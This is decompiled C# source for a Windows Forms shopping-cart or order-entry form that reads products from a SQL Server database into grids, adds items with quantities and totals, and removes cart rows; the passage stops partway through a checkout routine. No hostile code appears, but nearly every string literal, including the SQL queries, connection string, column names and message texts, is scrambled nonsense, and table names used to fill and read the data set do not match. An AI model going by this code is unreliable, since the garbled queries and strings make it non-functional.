using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Ay5;
using Be5;
using Fa32;
using Gf9;
using Microsoft.VisualBasic.CompilerServices;
using Ss7;
using j8Z;
using k6T;
using n5Y;
using o8S4F;
using s0Z;
using w4R;

namespace a3C;

public class Zg9
{
	private string Database;

	private SqlConnection Connection;

	private SqlDataAdapter DataAdapter;

	private SqlDataReader DataReader;

	private DataSet DataSet;

	private SqlCommand Command;

	private DataTable DataTable;

	private object DataGridView1;

	private object TextBox1;

	private object TextBox3;

	private object TextBox4;

	private object TextBox5;

	private object TextBox6;

	private object PictureBox1;

	private object Button9;

	private object ComboBox1;

	private object NumericUpDown1;

	private object DataGridView3;

	private object Label3;

	private object Label4;

	private object Label5;

	private object Button7;

	private object Button6;

	private object TextBox7;

	private object Button2;

	private object Button1;

	private object Enabled;

	public object UserId
	{
		[CompilerGenerated]
		get
		{
			return _UserId;
		}
		[CompilerGenerated]
		set
		{
			_UserId = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object MemberIdSet
	{
		[CompilerGenerated]
		get
		{
			return _MemberIdSet;
		}
		[CompilerGenerated]
		set
		{
			_MemberIdSet = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public void Sz3()
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		Database = "bnnbrre" + Environment.MachineName.ToString() + "kjlhjnm";
		Connection = new SqlConnection(Database);
		if (Connection.get_State() == ConnectionState.Closed)
		{
			Connection.Open();
		}
	}

	public void y1J()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		NewLateBinding.LateSet(DataGridView1, (Type)null, "DataSource", new object[1], (string[])null, (Type[])null);
		Sz3();
		DataAdapter = new SqlDataAdapter("hnjghfhtr", Connection);
		DataSet = new DataSet();
		DataSet.Clear();
		((DbDataAdapter)(object)DataAdapter).Fill(DataSet, "fdfrre");
		NewLateBinding.LateSet(DataGridView1, (Type)null, "DataSource", new object[1] { DataSet.Tables["cxvxdew"] }, (string[])null, (Type[])null);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView1, (Type)null, "Columns", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView1, (Type)null, "Columns", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
	}

	private void Qz7(object sender, DataGridViewCellEventArgs e)
	{
		j6Q();
		Aq1();
		NewLateBinding.LateSet(TextBox1, (Type)null, "ReadOnly", new object[1] { true }, (string[])null, (Type[])null);
		int num = Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateGet(DataGridView1, (Type)null, "SelectedCells", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "RowIndex", new object[0], (string[])null, (Type[])null, (bool[])null));
		object textBox = TextBox1;
		object[] array = new object[1];
		object dataGridView = DataGridView1;
		object[] obj = new object[1] { num };
		object[] array2 = obj;
		bool[] obj2 = new bool[1] { true };
		bool[] array3 = obj2;
		object obj3 = NewLateBinding.LateGet(dataGridView, (Type)null, "Rows", obj, (string[])null, (Type[])null, obj2);
		if (array3[0])
		{
			num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(int));
		}
		array[0] = NewLateBinding.LateGet(NewLateBinding.LateGet(obj3, (Type)null, "Cells", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null).ToString();
		NewLateBinding.LateSet(textBox, (Type)null, "Text", array, (string[])null, (Type[])null);
		object textBox2 = TextBox3;
		object[] array4 = new object[1];
		object obj4 = NewLateBinding.LateGet(DataGridView1, (Type)null, "Rows", array2 = new object[1] { num }, (string[])null, (Type[])null, array3 = new bool[1] { true });
		if (array3[0])
		{
			num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(int));
		}
		array4[0] = NewLateBinding.LateGet(NewLateBinding.LateGet(obj4, (Type)null, "Cells", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null).ToString();
		NewLateBinding.LateSet(textBox2, (Type)null, "Text", array4, (string[])null, (Type[])null);
		object textBox3 = TextBox4;
		object[] array5 = new object[1];
		object obj5 = NewLateBinding.LateGet(DataGridView1, (Type)null, "Rows", array2 = new object[1] { num }, (string[])null, (Type[])null, array3 = new bool[1] { true });
		if (array3[0])
		{
			num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(int));
		}
		array5[0] = NewLateBinding.LateGet(NewLateBinding.LateGet(obj5, (Type)null, "Cells", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null).ToString();
		NewLateBinding.LateSet(textBox3, (Type)null, "Text", array5, (string[])null, (Type[])null);
		object textBox4 = TextBox5;
		object[] array6 = new object[1];
		object obj6 = NewLateBinding.LateGet(DataGridView1, (Type)null, "Rows", array2 = new object[1] { num }, (string[])null, (Type[])null, array3 = new bool[1] { true });
		if (array3[0])
		{
			num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(int));
		}
		array6[0] = NewLateBinding.LateGet(NewLateBinding.LateGet(obj6, (Type)null, "Cells", new object[1] { 4 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null).ToString();
		NewLateBinding.LateSet(textBox4, (Type)null, "Text", array6, (string[])null, (Type[])null);
		object textBox5 = TextBox6;
		object[] array7 = new object[1];
		object obj7 = NewLateBinding.LateGet(DataGridView1, (Type)null, "Rows", array2 = new object[1] { num }, (string[])null, (Type[])null, array3 = new bool[1] { true });
		if (array3[0])
		{
			num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(int));
		}
		array7[0] = NewLateBinding.LateGet(NewLateBinding.LateGet(obj7, (Type)null, "Cells", new object[1] { 5 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null).ToString();
		NewLateBinding.LateSet(textBox5, (Type)null, "Text", array7, (string[])null, (Type[])null);
		object pictureBox = PictureBox1;
		object[] array8 = new object[1];
		object obj8 = NewLateBinding.LateGet(DataGridView1, (Type)null, "Rows", array2 = new object[1] { num }, (string[])null, (Type[])null, array3 = new bool[1] { true });
		if (array3[0])
		{
			num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(int));
		}
		array8[0] = Image.FromFile(NewLateBinding.LateGet(NewLateBinding.LateGet(obj8, (Type)null, "Cells", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
		NewLateBinding.LateSet(pictureBox, (Type)null, "Image", array8, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Button9, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
	}

	public void Yg1()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		Sz3();
		DataAdapter = new SqlDataAdapter("ewrsefdfv", Connection);
		DataTable = new DataTable();
		((DbDataAdapter)(object)DataAdapter).Fill(DataTable);
		NewLateBinding.LateSet(ComboBox1, (Type)null, "DataSource", new object[1] { DataTable }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(ComboBox1, (Type)null, "DisplayMember", new object[1] { "dxdferw" }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(ComboBox1, (Type)null, "ValueMember", new object[1] { "sdzsdw" }, (string[])null, (Type[])null);
	}

	public void Lc7()
	{
		Sz3();
		y1J();
		Yg1();
		NewLateBinding.LateSet(TextBox1, (Type)null, "ReadOnly", new object[1] { true }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(NumericUpDown1, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(DataGridView3, (Type)null, "ColumnCount", new object[1] { 7 }, (string[])null, (Type[])null);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView3, (Type)null, "Columns", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[1] { "xdfe" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView3, (Type)null, "Columns", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[1] { "qetw" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView3, (Type)null, "Columns", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[1] { "4t4tdfs" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView3, (Type)null, "Columns", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[1] { "zdze" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView3, (Type)null, "Columns", new object[1] { 4 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[1] { "yerxdf" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView3, (Type)null, "Columns", new object[1] { 5 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[1] { "cvcfr" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView3, (Type)null, "Columns", new object[1] { 6 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[1] { "gfgt5" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView3, (Type)null, "Columns", new object[1] { 6 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView1, (Type)null, "Columns", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView1, (Type)null, "Columns", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSet(PictureBox1, (Type)null, "Image", new object[1], (string[])null, (Type[])null);
		NewLateBinding.LateCall(NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSet(DataGridView3, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateCall(DataGridView1, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(DataGridView3, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSet(Label3, (Type)null, "Text", new object[1] { "er443" }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Label4, (Type)null, "Text", new object[1] { "zxvxvcre4" }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Label5, (Type)null, "Text", new object[1] { "fghth4" }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Button7, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Button9, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(Button6, (Type)null, "Text", new object[1] { "dd4qsdgftj" }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(ComboBox1, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
		MemberIdSet = "";
	}

	private void p0L(object sender, EventArgs e)
	{
		Lc7();
	}

	public void j6Q()
	{
		NewLateBinding.LateSet(TextBox1, (Type)null, "ReadOnly", new object[1] { true }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(NumericUpDown1, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
	}

	public void Aq1()
	{
		NewLateBinding.LateSet(TextBox1, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(NumericUpDown1, (Type)null, "Value", new object[1] { 1 }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(TextBox3, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(TextBox4, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(TextBox5, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(TextBox6, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
	}

	private void z7G2P(object sender, EventArgs e)
	{
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		string text = Conversions.ToString(NewLateBinding.LateGet(TextBox1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null));
		int num = Conversions.ToInteger(NewLateBinding.LateGet(NumericUpDown1, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null));
		string text2 = Conversions.ToString(NewLateBinding.LateGet(TextBox3, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null));
		if (Conversions.ToBoolean(Operators.OrObject(Operators.OrObject(Operators.OrObject((object)(Operators.CompareString(text2, "", false) == 0), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBox4, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBox5, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBox6, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
		{
			MessageBox.Show("xcxcw", "qweerfsdf", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		if (Operators.CompareString(text, "", false) == 0)
		{
			MessageBox.Show("fgesr3", "fhrth5y43or", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		int num2 = Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Count", new object[0], (string[])null, (Type[])null, (bool[])null));
		int num3 = Conversions.ToInteger(NewLateBinding.LateGet(TextBox4, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null));
		int num4 = Conversions.ToInteger(NewLateBinding.LateGet(TextBox5, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null));
		int num5 = Conversions.ToInteger(NewLateBinding.LateGet(TextBox6, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null));
		checked
		{
			object[] array2;
			bool[] array3;
			if (num2 == 0)
			{
				string[] array = new string[7]
				{
					text,
					Conversions.ToString(num),
					Conversions.ToString(num4),
					Conversions.ToString(num5),
					Conversions.ToString(num3),
					Conversions.ToString(num * num3),
					text2
				};
				object obj = NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null);
				object[] obj2 = new object[1] { array };
				array2 = obj2;
				bool[] obj3 = new bool[1] { true };
				array3 = obj3;
				NewLateBinding.LateCall(obj, (Type)null, "Add", obj2, (string[])null, (Type[])null, obj3, true);
				if (array3[0])
				{
					array = (string[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string[]));
				}
				Aq1();
				NewLateBinding.LateSet(PictureBox1, (Type)null, "Image", new object[1], (string[])null, (Type[])null);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView1, (Type)null, "Columns", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView1, (Type)null, "Columns", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView1, (Type)null, "Columns", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView1, (Type)null, "Columns", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
				y1J();
				NewLateBinding.LateSet(NumericUpDown1, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
				NewLateBinding.LateCall(DataGridView1, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(DataGridView3, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateSet(Button7, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(TextBox7, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(Button9, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
				Sj64Z();
				return;
			}
			int num6 = num2 - 1;
			int num7 = 0;
			while (true)
			{
				if (num7 <= num6)
				{
					object obj4 = NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", array2 = new object[1] { num7 }, (string[])null, (Type[])null, array3 = new bool[1] { true });
					if (array3[0])
					{
						num7 = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(int));
					}
					if (Operators.CompareString(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(obj4, (Type)null, "Cells", new object[1] { 6 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null)), text2, false) == 0)
					{
						break;
					}
					num7++;
					continue;
				}
				string[] array4 = new string[7]
				{
					text,
					Conversions.ToString(num),
					Conversions.ToString(num4),
					Conversions.ToString(num5),
					Conversions.ToString(num3),
					Conversions.ToString(num * num3),
					text2
				};
				object obj5 = NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null);
				object[] obj6 = new object[1] { array4 };
				array2 = obj6;
				bool[] obj7 = new bool[1] { true };
				array3 = obj7;
				NewLateBinding.LateCall(obj5, (Type)null, "Add", obj6, (string[])null, (Type[])null, obj7, true);
				if (array3[0])
				{
					array4 = (string[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string[]));
				}
				Aq1();
				NewLateBinding.LateSet(PictureBox1, (Type)null, "Image", new object[1], (string[])null, (Type[])null);
				y1J();
				NewLateBinding.LateSet(NumericUpDown1, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView1, (Type)null, "Columns", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView1, (Type)null, "Columns", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateCall(DataGridView1, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(DataGridView3, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateSet(Button7, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(Button9, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(TextBox7, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
				Sj64Z();
				return;
			}
			object obj8 = NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", array2 = new object[1] { num7 }, (string[])null, (Type[])null, array3 = new bool[1] { true });
			if (array3[0])
			{
				num7 = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(int));
			}
			int num8 = Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateGet(obj8, (Type)null, "Cells", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null)) + num;
			object obj9 = NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", array2 = new object[1] { num7 }, (string[])null, (Type[])null, array3 = new bool[1] { true });
			if (array3[0])
			{
				num7 = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(int));
			}
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(obj9, (Type)null, "Cells", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[1] { num8 }, (string[])null, (Type[])null, false, true);
			object obj10 = NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", array2 = new object[1] { num7 }, (string[])null, (Type[])null, array3 = new bool[1] { true });
			if (array3[0])
			{
				num7 = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(int));
			}
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(obj10, (Type)null, "Cells", new object[1] { 5 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[1] { num8 * num3 }, (string[])null, (Type[])null, false, true);
			Aq1();
			y1J();
			NewLateBinding.LateSet(NumericUpDown1, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView1, (Type)null, "Columns", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(DataGridView1, (Type)null, "Columns", new object[1] { 3 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSet(PictureBox1, (Type)null, "Image", new object[1], (string[])null, (Type[])null);
			NewLateBinding.LateCall(DataGridView1, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(DataGridView3, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateSet(Button7, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Button9, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(TextBox7, (Type)null, "Text", new object[1] { "" }, (string[])null, (Type[])null);
			Sj64Z();
		}
	}

	private void i6G1Y(object sender, EventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Count", new object[0], (string[])null, (Type[])null, (bool[])null)) == 0)
		{
			MessageBox.Show("fdgdfre4tEmpty!", "Dthtr54346or", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(Button2, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"Decvcgfrelete", false))
		{
			NewLateBinding.LateSet(DataGridView1, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(DataGridView3, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Button2, (Type)null, "Text", new object[1] { "Cangfhkjgur43cel" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Button1, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateCall(DataGridView1, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(DataGridView3, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		else
		{
			NewLateBinding.LateSet(DataGridView1, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(DataGridView3, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Button2, (Type)null, "Text", new object[1] { "Deghnghtj5eylete" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Button1, (Type)null, "Enabled", new object[1] { Enabled }, (string[])null, (Type[])null);
			NewLateBinding.LateCall(DataGridView1, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(DataGridView3, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
	}

	private void b2P4L(object sender, DataGridViewCellEventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Invalid comparison between Unknown and I4
		if ((int)MessageBox.Show("Afgfgrge4wt", "Dfgfgrew3nu", (MessageBoxButtons)4, (MessageBoxIcon)32) == 6)
		{
			object obj = NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[1];
			object dataGridView = DataGridView3;
			object[] array2 = new object[1];
			object obj2 = (array2[0] = 0);
			array[0] = NewLateBinding.LateGet(dataGridView, (Type)null, "SelectedRows", array2, (string[])null, (Type[])null, (bool[])null);
			object[] array3 = array;
			bool[] obj3 = new bool[1] { true };
			bool[] array4 = obj3;
			NewLateBinding.LateCall(obj, (Type)null, "Remove", array, (string[])null, (Type[])null, obj3, true);
			if (array4[0])
			{
				NewLateBinding.LateSetComplex(dataGridView, (Type)null, "SelectedRows", new object[2]
				{
					obj2,
					array3[0]
				}, (string[])null, (Type[])null, true, false);
			}
			NewLateBinding.LateSet(DataGridView3, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Button2, (Type)null, "Text", new object[1] { "Dffgre4wt3e" }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(Button1, (Type)null, "Enabled", new object[1] { Enabled }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(DataGridView1, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null);
			NewLateBinding.LateCall(DataGridView1, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(DataGridView3, (Type)null, "ClearSelection", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			Sj64Z();
		}
	}

	private void k6EXw(object sender, EventArgs e)
	{
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Invalid comparison between Unknown and I4
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		//IL_0224: Unknown result type (might be due to invalid IL or missing references)
		//IL_022e: Expected O, but got Unknown
		//IL_02ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b5: Expected O, but got Unknown
		//IL_0332: Unknown result type (might be due to invalid IL or missing references)
		//IL_033c: Expected O, but got Unknown
		//IL_04de: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e8: Expected O, but got Unknown
		//IL_0510: Unknown result type (might be due to invalid IL or missing references)
		int num = Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateGet(DataGridView3, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Count", new object[0], (string[])null, (Type[])null, (bool[])null));
		if (num == 0)
		{
			MessageBox.Show("Ofhfgt4w32t4ht", "fghgnmhhgdf4ewt", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		string text = "ggfre34";
		string text2 = Conversions.ToString(UserId);
		string text3 = Conversions.ToString(MemberIdSet);
		if (Operators.CompareString(text3, "", false) == 0)
		{
			MessageBox.Show("fgfgdgr4wt", "gjfth4et34", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else
		{
			if ((int)MessageBox.Show("mghre4w", "hjmjhrte4t", (MessageBoxButtons)4, (MessageBoxIcon)32) != 6)
			{
				return;
			}
			string text4 = string.Format("gjyhjfte34", DateTime.Now);
			Sz3();
			string text5 = "jmmhgfdgew3";
			Command = new SqlCommand(text5, Connection);
			DataReader = Command.ExecuteReader();
			checked
			{
				string text10;
				if (DataReader.get_HasRows())
				{
					string text7 = default(string);
					string text8 = default(string);
					string text9 = default(string);
					int num4 = default(int);
					while (DataReader.Read())
					{
						string text6 = DataReader.get_Item("t4te4t5eyfg").ToString();
						int num2 = 8;
						do
						{
							text7 += Conversions.ToChar(text6[num2].ToString());
							num2++;
						}
						while (num2 <= 11);
